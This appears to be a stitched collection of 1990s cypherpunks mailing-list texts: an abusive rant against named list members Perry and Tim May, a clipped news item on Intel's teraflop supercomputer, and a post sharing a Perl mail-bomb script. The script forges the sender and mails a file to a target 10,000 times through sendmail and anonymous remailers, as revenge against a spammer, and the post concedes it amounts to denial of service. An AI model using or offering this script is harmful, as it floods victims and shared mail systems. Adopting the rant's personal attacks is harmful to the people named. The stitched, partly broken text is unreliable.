perry, of course, is a dysfunctional human "cipher" himself,
who couldn't be civil if he was at a tea party of grandmothers.
yes, in 15 minutes he would end up screaming and
 mooning them all because they hadn't heard of Netscape or Chaum or something. what a prick. so he wants to lobby congress and write some code??
well perry, good for you. you just go off on your little
excursion. let us know how you are doing. send some postcards
to Blacknet, OK???
as for TCM and his invest-in-stocks-and-evade-taxes shtick, it's
starting to bore me too. frankly I think that both TCM and
PM should take a long, long vacation from the cypherpunks list
and go take a cruise together. yes, help patch up that relationship
that is so strained lately. it hurts us all to see two grown
men fighting each other. make love, not war!!! hehehehe

I think we ought to just throw TIM MAY out of the list. let's EXCOMMUNICATE HIM. its becoming increasingly clear
that he is the source of all our problems. I mean, isn't
it obvious that our progress has stalled? who has written
any code within the last 3 days? if we got rid of him,
it would be EVOLUTION IN ACTION. this is ERIC HUGHES'
mailing list, and eric hughes knows how to write some
decent code. I mean, TCM's signature doesn't even have any
geek code, and he hasn't changed it in 4 years or so,
at least since my last grandparent died (and she was considerably more skillful at programming than TCM by
knowing how to make toast).
get rid of all the pricks who continually spout and spew conspiracy
theories. let TCM go and find himself a new mailing list.
that would be a fair comeuppance if he found that he couldn't
learn to do squish because he doesn't have the slightest
clue. he's a leech, a parasite, sucking on the work of
others, pretending that he is at the forefront of our
cause when he is only at the forefront of maniacal egomania.
what has he contributed to the cause? SQUAT. just a lot
of ranting about conspiracy theories and his Stock Pick
of the Week crap. "the web is really growing. people should
focus on it". well, THANK YOU VERY MUCH, MR. BRILLIANT
COMMENTATOR AND VISIONARY, T.C.MAY, I would have never
have THOUGHT of that in a zillion years, but now that you
point it out, I GUESS YOU'RE RIGHT.

Intel Wins Contract to Develop World's Fastest
By Lawrence M. Fisher
San Francisco, Sept. 7 -- The Intel Corporation said
today that it had won a a contract from the Department of
Energy to develop what it called the world's fastest
The machine, to be built at an estimated cost of $45
million, would use 9,000 of Intel's forthcoming P6
microprocessors linked in a configuration known as
massively parallel. In recent years, massively parallel
computers using thousands of relatively inexpensive
off-the-shelf chips have stolen the performance lead from
traditional supercomputers like those made famous by Cray
Research Inc., which use far fewer, but far more powerful
Intel said its new supercomputer would be the first to
achieve the goal of calculating more than a trillion
floating-point operations a second, known as a teraflop.
The machine, to be kept at Sandia National Laboratories
In Albuquerque, N.M., would be used by Department of
Energy scientists to study a variety of complex problems,
foremost among them nuclear weapons safety.
"President Clinton is committed to ending underground
nuclear testing," Victor Reis, Assistant Secretary for
Energy Programs, said in a statement. "Computer
simulation will be a principal means for insuring the
safety, reliability and effectiveness of the U.S. nuclear
deterrent. We are embarking on a 10-year program to
advance the state of high performance computing to meet
national security objectives," he said. ...

Again, we're Spammed by a moron.
Time to fire up the old remailers!
[At least they do this on weekends, when we have
time for creative revenge!] Hehehehehe...

OK...I know this borders on a "denial of service" attack since it may effect innocent users. How would you like to be the one to explain to  your System Administrator that the Megabytes of returned Spam on the disk are yours? I realize that some peoples implementations of Sendmail will tell who
your are regardless, so you might have to modify the "system" line for
your own tastes. Also you might *not* want to be anon. Please feel
free to modify to your own tastes. The delay loop is to space out the load. I also tried it with premail instead of Sendmail and it
went thru the remailers just fine. It should be capable of running in the background. Only took 5 minutes to write and a couple of remailers to test.
print "Who does this go to?: ";
chop($name = );
print "What is the filename to send?: ";
chop($filename = );
for ($a=0;$a<100;$a++) {
for ($b=0;$b<100;$b++) {
system ("/usr/lib/sendmail -f nobody $name < $filename");
for ($x=0;$x<600000;$x++){};
